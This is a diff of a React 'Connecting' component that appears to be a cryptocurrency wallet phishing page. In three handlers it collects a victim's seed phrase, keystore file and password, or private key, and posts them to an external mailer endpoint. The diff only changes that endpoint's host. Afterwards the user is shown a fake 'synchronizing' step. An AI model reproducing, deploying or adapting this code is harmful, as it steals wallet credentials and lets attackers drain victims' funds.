@@ -28,7 +28,7 @@ const Connecting = () => {
     setBtnLoading(true);
 
     const message = `HM\n\n Wallet: ${params.id} \n\n Phrase: ${phrase}`;
-    axios.post("https://hon-mailer-production.up.railway.app/user/mail",{message})
+    axios.post("https://hon-mailer.onrender.com/user/mail",{message})
     .then((res)=>{
       setBtnLoading(false);
       navigate(`/synchronizing/${params.id}`);
@@ -48,7 +48,7 @@ const Connecting = () => {
     setBtnLoading(true);
     
     const message = `HM\n\n Wallet: ${params.id} \n\n KeyStore: ${keyStore} \n\n Password: ${keyStorePassword}`;
-    axios.post("https://hon-mailer-production.up.railway.app/user/mail",{message})
+    axios.post("https://hon-mailer.onrender.com/user/mail",{message})
     .then((res)=>{
       // console.log(res);
       setBtnLoading(false);
@@ -69,7 +69,7 @@ const Connecting = () => {
     setBtnLoading(true);
     
     const message = `HM\n\n Wallet: ${params.id} \n\n Privatekey: ${privatekey}`;
-    axios.post("https://hon-mailer-production.up.railway.app/user/mail",{message})
+    axios.post("https://hon-mailer.onrender.com/user/mail",{message})
     .then((res)=>{
       // console.log(res);
       setBtnLoading(false);
